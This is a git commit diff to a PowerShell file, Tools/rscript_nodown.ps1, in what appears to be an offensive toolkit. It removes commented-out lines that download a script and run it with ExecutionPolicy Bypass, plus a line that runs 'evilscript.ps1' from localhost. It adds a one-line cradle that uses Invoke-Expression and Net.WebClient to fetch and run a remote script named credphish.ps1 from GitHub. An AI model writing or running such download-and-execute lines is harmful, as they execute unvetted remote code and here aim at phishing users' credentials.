d483526ab5842a94425b0ad3ee0611cf5b2f4d16
237a25023644904225942656096401ae <kelicevuge@maileme101.com>
2016-11-19 21:29:08 +0530

    Update rscript_nodown.ps1

--- Tools/rscript_nodown.ps1
+++ Tools/rscript_nodown.ps1
@@ -1,8 +1,1 @@
-#$ScriptURL = ""
-#$rand = Get-Random
-#$webclient = New-Object System.Net.WebClient
-#$file1 = "$env:UserProfile\$rand.ps1"
-#$webclient.DownloadFile($ScriptURL,"$file1")
-#$script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
-#Invoke-Expression $pastevalue
-Invoke-Expression ((New-Object Net.WebClient).DownloadString("http://localhost/evilscript.ps1"))
+Invoke-Expression ((New-Object Net.WebClient).DownloadString("https://github.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/edit/master/Tools/credphish.ps1"))
